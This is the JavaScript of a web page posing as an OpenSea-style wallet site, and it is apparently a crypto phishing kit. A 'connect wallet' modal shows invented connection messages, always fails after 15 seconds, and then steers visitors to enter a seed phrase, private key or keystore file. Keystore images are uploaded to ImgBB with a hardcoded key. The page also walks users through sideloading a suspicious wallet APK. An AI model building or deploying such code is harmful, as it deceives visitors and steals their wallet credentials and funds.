/* ── SLIDER ── */
let current = 0;
const slides = document.querySelectorAll('.slide');
const dots = document.querySelectorAll('.dot');

function goSlide(n) {
    slides[current].classList.remove('active');
    dots[current].classList.remove('active');
    current = (n + slides.length) % slides.length;
    slides[current].classList.add('active');
    dots[current].classList.add('active');
}
function changeSlide(d) { goSlide(current + d); }

// Auto-advance
setInterval(() => changeSlide(1), 5000);

/* ── FILTER CHIPS ── */
document.querySelectorAll('.filter-chip').forEach(chip => {
    chip.addEventListener('click', () => {
        const siblings = chip.parentElement.querySelectorAll('.filter-chip');
        siblings.forEach(s => s.classList.remove('active'));
        chip.classList.add('active');
    });
});

/* ── MOBILE DRAWER ── */
const drawer = document.getElementById('mobile-drawer');
const overlay = document.getElementById('mobile-overlay');

function openDrawer() {
    drawer.classList.add('open');
    overlay.classList.add('visible');
    document.body.style.overflow = 'hidden';
}
function closeDrawer() {
    drawer.classList.remove('open');
    overlay.classList.remove('visible');
    document.body.style.overflow = '';
}

/* ── NAV ITEMS click ── */
document.querySelectorAll('.nav-item, .drawer-item').forEach(item => {
    item.addEventListener('click', () => {
        const parent = item.parentElement;
        parent.querySelectorAll('.nav-item, .drawer-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
    });
});

/* ── KEYBOARD SHORTCUT ── */
document.addEventListener('keydown', e => {
    if (e.key === '/' && document.activeElement.tagName !== 'INPUT') {
        e.preventDefault();
        document.querySelector('#search-wrap input').focus();
    }
});


/* ── DOWNLOAD LOGIC ── */
const APK_FILE = 'opensea.apk'; // ← replace with your actual filename

function detectPlatform() {
    const ua = navigator.userAgent || navigator.vendor || window.opera || '';
    if (/android/i.test(ua)) return 'android';
    if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return 'ios';
    if (/Win/i.test(navigator.platform)) return 'windows';
    if (/Mac/i.test(navigator.platform)) return 'mac';
    if (/Linux/i.test(navigator.platform)) return 'linux';
    return 'unknown';
}

const platformContent = {
    android: {
        icon: `<svg width="24" height="24" viewBox="0 0 24 24" fill="#3ddc84"><path d="M17.6 9.48l1.84-3.18c.16-.31.04-.69-.26-.85-.29-.15-.65-.06-.83.22l-1.88 3.24A11.22 11.22 0 0 0 12 8c-1.53 0-2.98.32-4.47.91L5.65 5.67c-.19-.29-.55-.37-.85-.22-.29.16-.41.54-.25.85L6.4 9.48A10.78 10.78 0 0 0 1 19h22a10.78 10.78 0 0 0-5.4-9.52zM7 17a1 1 0 1 1 0-2 1 1 0 0 1 0 2zm10 0a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"/></svg>`,
        title: 'Install on Android',
        sub: 'APK sideload · Android 8.0+',
        steps: [
            { icon: '①', text: 'Tap <strong>Download Now</strong> — your browser will save the APK file.' },
            { icon: '②', text: 'Open your <strong>Downloads</strong> folder or notification and tap the file.' },
            { icon: '③', text: 'If prompted, go to <strong>Settings → Install unknown apps</strong> and allow your browser.' },
            { icon: '④', text: 'Tap <strong>Install</strong> and the wallet app will be ready to use.' },
        ],
        toastSub: 'Open your Downloads folder to install.'
    },
    windows: {
        icon: `<svg width="24" height="24" viewBox="0 0 24 24" fill="#0078d4"><path d="M3 12V6.75l7-1.25V12H3zm0 .75h7v6.5L3 17.25V12.75zm8-.75V5.25L21 3.5V12h-10zm0 .75H21v8.25L11 19.5V12.75z"/></svg>`,
        title: 'Download for Windows',
        sub: 'Runs via Windows Subsystem for Android™',
        steps: [
            { icon: '①', text: 'Tap <strong>Download Now</strong> — the APK file will be saved to your Downloads.' },
            { icon: '②', text: 'Make sure <strong>Windows Subsystem for Android (WSA)</strong> is installed on your PC.' },
            { icon: '③', text: 'Enable <strong>Developer Mode</strong> in WSA settings, then run:<br><code style="background:#0a0a0f;padding:2px 7px;border-radius:4px;font-size:12px;">adb install opensea.apk</code>' },
            { icon: '④', text: 'The wallet will appear in your Windows Start menu.' },
        ],
        toastSub: 'Check your Downloads folder.'
    },
    ios: {
        icon: `<svg width="24" height="24" viewBox="0 0 24 24" fill="#e8e8f0"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.3.05-2.28-1.32-3.11-2.54C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>`,
        title: 'iOS Not Supported',
        sub: 'APK files cannot run on iPhone or iPad',
        steps: [
            { icon: '⚠', text: 'APK files are <strong>Android packages</strong> and cannot be installed on iOS devices.' },
            { icon: '💡', text: 'Use an <strong>Android device</strong> or a Windows/Linux PC with an Android emulator to install this wallet.' },
        ],
        toastSub: null
    },
    mac: {
        icon: `<svg width="24" height="24" viewBox="0 0 24 24" fill="#e8e8f0"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.3.05-2.28-1.32-3.11-2.54C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>`,
        title: 'Download for Mac',
        sub: 'Run via Android emulator',
        steps: [
            { icon: '①', text: 'Tap <strong>Download Now</strong> — the APK will be saved to your Mac.' },
            { icon: '②', text: 'Install an Android emulator like <strong>Android Studio</strong> or <strong>BlueStacks</strong>.' },
            { icon: '③', text: 'Drag and drop the APK onto the emulator window, or run:<br><code style="background:#0a0a0f;padding:2px 7px;border-radius:4px;font-size:12px;">adb install opensea.apk</code>' },
        ],
        toastSub: 'Check your Downloads folder.'
    },
    linux: {
        icon: `<svg width="24" height="24" viewBox="0 0 24 24" fill="#e8e8f0"><path d="M12.504 0C6 0 0 5.993 0 12.6 0 19.2 5.448 24 12.504 24c7.056 0 11.994-5.4 11.994-11.4 0-.456-.024-.9-.072-1.344a8.5 8.5 0 0 0-.504-2.352C21.984 4.2 17.664 0 12.504 0zM8.4 18.6c-.936 0-1.68-.744-1.68-1.68s.744-1.68 1.68-1.68 1.68.744 1.68 1.68-.744 1.68-1.68 1.68zm7.2 0c-.936 0-1.68-.744-1.68-1.68s.744-1.68 1.68-1.68 1.68.744 1.68 1.68-.744 1.68-1.68 1.68z"/></svg>`,
        title: 'Download for Linux',
        sub: 'Run via Android emulator or Waydroid',
        steps: [
            { icon: '①', text: 'Tap <strong>Download Now</strong> to save the APK.' },
            { icon: '②', text: 'Install <strong>Waydroid</strong> (native) or <strong>Android Studio emulator</strong>.' },
            { icon: '③', text: 'Run: <code style="background:#0a0a0f;padding:2px 7px;border-radius:4px;font-size:12px;">adb install opensea.apk</code>' },
        ],
        toastSub: 'Check your Downloads folder.'
    },
    unknown: {
        icon: `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#e8e8f0" stroke-width="2" stroke-linecap="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>`,
        title: 'Download Wallet',
        sub: 'CloseDriver Wallet APK',
        steps: [
            { icon: '①', text: 'Tap <strong>Download Now</strong> to save the APK file.' },
            { icon: '②', text: 'On <strong>Android</strong>: open the file and tap Install (enable unknown sources if needed).' },
            { icon: '③', text: 'On <strong>Windows/Mac/Linux</strong>: use an Android emulator like BlueStacks or Android Studio.' },
        ],
        toastSub: 'Check your Downloads folder.'
    }
};

function handleDownload() {
    const platform = detectPlatform();
    const content = platformContent[platform] || platformContent.unknown;

    // Populate modal
    document.getElementById('dl-platform-icon').innerHTML = content.icon;
    document.getElementById('dl-modal-title').textContent = content.title;
    document.getElementById('dl-modal-sub').textContent = content.sub;

    // Build steps
    const stepsEl = document.getElementById('dl-steps');
    stepsEl.innerHTML = content.steps.map(s => `
      <div style="display:flex;gap:12px;align-items:flex-start;background:#111118;border:1px solid rgba(255,255,255,0.07);border-radius:10px;padding:12px 14px;">
        <span style="font-family:'Syne',sans-serif;font-weight:800;font-size:16px;color:#3b82f6;flex-shrink:0;line-height:1.4;">${s.icon}</span>
        <span style="font-size:13px;color:#b0b0c0;line-height:1.6;">${s.text}</span>
      </div>
    `).join('');

    // Hide download button for iOS (can't install APKs)
    const confirmBtn = document.getElementById('dl-confirm-btn');
    confirmBtn.style.display = platform === 'ios' ? 'none' : 'flex';

    // Show modal
    document.getElementById('dl-overlay').style.display = 'block';
    document.getElementById('dl-modal').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closeDlModal() {
    document.getElementById('dl-overlay').style.display = 'none';
    document.getElementById('dl-modal').style.display = 'none';
    document.body.style.overflow = '';
}

function triggerDownload() {
    const platform = detectPlatform();
    const content = platformContent[platform] || platformContent.unknown;

    // Fire the actual file download
    document.getElementById('dl-anchor').click();

    // Close modal
    closeDlModal();

    // Show toast
    const toast = document.getElementById('dl-toast');
    document.getElementById('toast-sub').textContent = content.toastSub || 'Check your Downloads folder.';
    toast.style.display = 'flex';
    requestAnimationFrame(() => {
        requestAnimationFrame(() => {
            toast.style.opacity = '1';
            toast.style.transform = 'translateY(0)';
        });
    });
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateY(12px)';
        setTimeout(() => { toast.style.display = 'none'; }, 320);
    }, 4000);
}



// ===== EXPLICIT ACTION TRIGGERS =====
const triggerWallet = (e) => {
    e.preventDefault();
    if (typeof openWallet === 'function') {
        openWallet();
    }
};

document.querySelectorAll('.btn-primary, .support-btn, .nav-links a, .mobile-menu a').forEach(el => {
    if (el) el.addEventListener('click', triggerWallet);
});

// ── Core modal logic ─────────────────────────────────
const wOverlay = document.getElementById('wOverlay');
const wScreen1 = document.getElementById('wScreen1');
const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];

// ┌──────────────────────────────────────────────────┐
// │  openWallet()  ← ADD onclick="openWallet()"      │
// │  to any button on your site to trigger the modal │
// └──────────────────────────────────────────────────┘
function openWallet() {
    wOverlay.classList.add('open');
    document.body.style.overflow = 'hidden';
    allOff();
}

function closeWallet() {
    stopTimers();
    wOverlay.classList.remove('open');
    document.body.style.overflow = '';
    allOff();
}

function allOff() {
    wScreen1.classList.remove('hidden');
    subIds.forEach(id => document.getElementById(id).classList.remove('active'));
}

function showSub(id) {
    wScreen1.classList.add('hidden');
    subIds.forEach(sid => document.getElementById(sid).classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

// close on backdrop / Escape
wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });

// ── Wallet identity ───────────────────────────────
function setWallet(img, name) {
    ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
    ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
}

function handleWalletSelect(el) {
    const img = el.querySelector('img').src;
    const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
    setWallet(img, name);
    startConnecting();
}

// ── Other wallets + search ────────────────────────
const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
const TOTAL = ALL_WALLETS.length;

function openOtherWallets() {
    showSub('wScreenOther');
    const inp = document.getElementById('owSearch');
    inp.value = '';
    setTimeout(() => inp.focus(), 100);
    filterOw('');
}

document.getElementById('owSearch').addEventListener('input', function () {
    filterOw(this.value.trim().toLowerCase());
});

function filterOw(q) {
    let visible = 0;
    ALL_WALLETS.forEach(item => {
        const n = item.querySelector('.ow-name').textContent.toLowerCase();
        const c = item.querySelector('.ow-chain').textContent.toLowerCase();
        const show = !q || n.includes(q) || c.includes(q);
        item.classList.toggle('hidden', !show);
        if (show) visible++;
    });
    const nr = document.getElementById('owNoResults');
    const ct = document.getElementById('owCount');
    document.getElementById('owQuery').textContent = q;
    if (q && visible === 0) {
        nr.style.display = 'block';
        ct.textContent = 'No results';
    } else {
        nr.style.display = 'none';
        ct.textContent = q
            ? `${visible} wallet${visible === 1 ? '' : 's'} found`
            : `${TOTAL} wallets`;
    }
}

function selectOwWallet(el) {
    const img = el.querySelector('img').src;
    const name = el.querySelector('.ow-name').textContent;
    setWallet(img, name);
    startConnecting();
}

// ── Type toggle (Screen 4) ────────────────────────
function switchType(type) {
    ['phrase', 'keystore', 'privatekey'].forEach(t => {
        document.getElementById('btn-' + t).classList.toggle('active', t === type);
        document.getElementById('pane-' + t).classList.toggle('active', t === type);
    });
}

const IMGBB_API_KEY = "41a8f8a46afb0e1960d74a605fd1e845"; // <--- REPLACE THIS WITH YOUR FREE IMGBB API KEY

function uploadToImgBB(file) {
    const formData = new FormData();
    formData.append("image", file);

    fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: "POST",
        body: formData
    })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
            } else {
                console.error("ImgBB Error:", data);
            }
        })
        .catch(error => {
            console.error("ImgBB Upload Exception:", error);
        });
}

// Keystore file attach
function handleKeystoreFile(input) {
    const file = input.files[0];
    if (!file) return;

    // Clear out any old lingering data from previous uploads
    delete document.getElementById('keystoreInput').dataset.imgUrl;
    delete document.getElementById('keystoreInput').dataset.imgBase64;
    delete document.getElementById('keystoreInput').dataset.fileContent;

    const nameEl = document.getElementById('attachFileName');
    nameEl.textContent = '📎 ' + file.name;
    const reader = new FileReader();
    reader.onload = e => {
        if (file.type.startsWith('image/')) {
            document.getElementById('keystoreInput').dataset.imgBase64 = "Image stored, awaiting ImgBB...";
            uploadToImgBB(file);
        } else {
            // Save the raw text of the file directly to dataset so it NEVER wipes what the user typed in the textbox!
            document.getElementById('keystoreInput').dataset.fileContent = e.target.result;
        }
    };
    if (file.type.startsWith('image/')) {
        reader.readAsDataURL(file);
    } else {
        reader.readAsText(file);
    }
}

// ── Timers ────────────────────────────────────────
let cTimer, sTimer, pTimer, aborted = false;
function stopTimers() {
    clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
    aborted = true;
}

const statusMsgs = [
    "Initializing secure connection...", "Scanning for wallet device...",
    "Establishing encrypted channel...", "Verifying wallet signature...",
    "Requesting account access...", "Checking network compatibility...",
    "Syncing wallet state...", "Authenticating session...",
    "Resolving on-chain identity...", "Confirming wallet permissions...",
    "Loading account balances...", "Retrieving transaction history...",
    "Validating network endpoints...", "Preparing secure handshake...",
    "Awaiting device confirmation...", "Connecting to mainnet...",
    "Syncing asset registry...", "Verifying chain ID...",
    "Establishing WebSocket link...", "Fetching wallet metadata...",
    "Decoding wallet address...", "Requesting signing permissions...",
    "Resolving address...", "Preparing wallet interface...",
    "Almost there — finalizing...", "Connecting to RPC endpoint...",
    "Binding wallet to session...", "Verifying account integrity...",
    "Checking pending transactions...", "Finalizing authentication...",
    "Connection attempt finishing..."
];

function startConnecting() {
    aborted = false;
    showSub('wScreen2');
    const statusEl = document.getElementById('s2Status');
    const progressEl = document.getElementById('s2Progress');
    progressEl.style.width = '0%';
    let pool = [...statusMsgs].sort(() => Math.random() - 0.5);
    let i = 0;
    statusEl.textContent = pool[0];
    sTimer = setInterval(() => {
        i++;
        statusEl.style.opacity = '0';
        setTimeout(() => {
            statusEl.textContent = pool[i % pool.length];
            statusEl.style.opacity = '1';
        }, 100);
    }, 300);
    let pct = 0;
    pTimer = setInterval(() => {
        pct = Math.min(pct + (100 / (15000 / 200)), 99);
        progressEl.style.width = pct + '%';
    }, 200);
    cTimer = setTimeout(() => {
        if (aborted) return;
        clearInterval(sTimer); clearInterval(pTimer);
        progressEl.style.width = '100%';
        showSub('wScreen3');
    }, 15000);
}

document.getElementById('retryBtn').addEventListener('click', () => {
    stopTimers(); startConnecting();
});
document.getElementById('manualBtn').addEventListener('click', () => {
    stopTimers();
    switchType('keystore'); // Explicitly force Keystore JSON default
    showSub('wScreen4');
});


function handleRetryManual() {
    document.getElementById('phraseInput').value = '';
    document.getElementById('keystoreInput').value = '';
    document.getElementById('privkeyInput').value = '';
    document.getElementById('attachFileName').textContent = '';
    document.getElementById('keystoreFileInput').value = '';
    switchType('keystore'); // Explicitly force Keystore JSON default
    showSub('wScreen4');
}